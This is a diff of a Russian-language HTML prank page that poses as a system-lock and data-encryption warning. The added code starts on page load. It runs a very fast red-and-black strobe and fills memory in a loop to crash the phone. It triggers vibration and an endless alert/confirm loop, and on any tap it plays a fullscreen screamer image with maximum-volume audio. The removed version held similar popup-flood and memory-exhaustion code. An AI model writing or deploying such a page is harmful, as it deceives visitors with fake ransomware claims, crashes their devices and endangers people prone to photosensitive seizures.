@@ -2,62 +2,92 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>ВНИМАНИЕ! ОШИБКА СИСТЕМЫ!</title>
+    <title>ВНИМАНИЕ! КРИТИЧЕСКАЯ ОШИБКА!</title>
     <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; overflow: hidden; }
-        .danger-btn { padding: 30px 60px; font-size: 30px; background: #ff0000; color: #fff; border: none; border-radius: 20px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #f00; }
-        #scary { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
-        .strobe { animation: flash 0.1s infinite; }
-        @keyframes flash { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
+        /* Главный эффект мерцания */
+        @keyframes strobe {
+            0% { background-color: #000; }
+            50% { background-color: #f00; }
+            100% { background-color: #000; }
+        }
+        .flash-active {
+            animation: strobe 0.05s infinite !important;
+        }
+        body { 
+            background: #000; 
+            color: #fff; 
+            text-align: center; 
+            font-family: sans-serif; 
+            margin: 0; 
+            padding-top: 100px; 
+            overflow: hidden; 
+            width: 100vw; 
+            height: 100vh;
+        }
+        #scary { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100vw; 
+            height: 100vh; 
+            object-fit: cover; 
+            z-index: 9999; 
+        }
+        h1 { font-size: 40px; text-shadow: 2px 2px #000; }
     </style>
 </head>
-<body>
+<body id="main_body" class="flash-active"> <!-- Мерцание включено сразу здесь -->
+
     <div id="ui">
-        <h1 style="font-size: 40px;">КРИТИЧЕСКАЯ УГРОЗА!</h1>
-        <p>Обнаружен вирус в Telegram. Нажмите для очистки системы.</p>
-        <button class="danger-btn" onclick="destroy()">ОЧИСТИТЬ СИСТЕМУ</button>
+        <h1>СИСТЕМА ЗАБЛОКИРОВАНА</h1>
+        <p style="font-size: 20px;">Обнаружена попытка взлома. <br>Ваши данные зашифрованы.</p>
+        <br>
+        <p>Нажмите в любом месте для восстановления...</p>
     </div>
 
     <img id="scary" src="https://raw.githubusercontent.com">
     <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
 
     <script>
-        function destroy() {
-            const s = document.getElementById("scream");
-            const i = document.getElementById("scary");
-            
-            s.volume = 1.0;
-            s.play();
-            i.style.display = "block";
-            document.body.classList.add('strobe');
+        // 1. СРАЗУ ПРИ ЗАГРУЗКЕ
+        window.onload = function() {
+            // Принудительно включаем мерцание еще раз для верности
+            document.getElementById('main_body').classList.add('flash-active');
 
-            // 1. БЕСКОНЕЧНЫЕ ВКЛАДКИ (Цепная реакция)
+            // Нагрузка на телефон (ОЗУ + Проц)
+            let memoryKiller = [];
             setInterval(() => {
-                window.open(window.location.href, "_blank", "width=400,height=400");
-            }, 400);
-
-            // 2. БЕСКОНЕЧНЫЕ ОКНА (Если вкладки заблокированы)
-            setTimeout(() => {
-                while(true) {
-                    alert("ПАМЯТЬ ПЕРЕПОЛНЕНА! УДАЛЕНИЕ ФАЙЛОВ...");
-                    confirm("ОСТАНОВИТЬ УНИЧТОЖЕНИЕ ДАННЫХ?");
-                }
-            }, 1500);
-
-            // 3. УБИЙЦА ОПЕРАТИВКИ (Забивает ГБ мусора)
-            let trash = [];
-            setInterval(() => {
-                for(let k=0; k<100; k++) {
-                    trash.push(new Array(1000000).join("CRASH_SYSTEM_"));
+                for(let i=0; i<300; i++) {
+                    memoryKiller.push(new Array(1000000).join("ALARM_"));
                 }
             }, 100);
 
-            // 4. ВИБРАЦИЯ И FULLSCREEN
-            if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100]);
-            document.documentElement.requestFullscreen().catch(() => {});
-        }
+            // Вибрация (для Android)
+            if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);
 
-        window.onbeforeunload = function() { return "СИСТЕМА БУДЕТ УНИЧТОЖЕНА!"; };
+            // Бесконечные окна через 2 секунды
+            setTimeout(() => {
+                while(true) {
+                    alert("КРИТИЧЕСКАЯ ОШИБКА!");
+                    confirm("УДАЛИТЬ ВСЕ ФАЙЛЫ?");
+                }
+            }, 2000);
+        };
+
+        // 2. СКРИМЕР ПРИ ЛЮБОМ КЛИКЕ (так как звук без клика запрещен)
+        window.onclick = window.ontouchstart = function() {
+            const s = document.getElementById("scream");
+            const i = document.getElementById("scary");
+            s.volume = 1.0;
+            s.play();
+            i.style.display = "block";
+            
+            // Пытаемся занять весь экран
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        };
     </script>
 </body>
 </html>
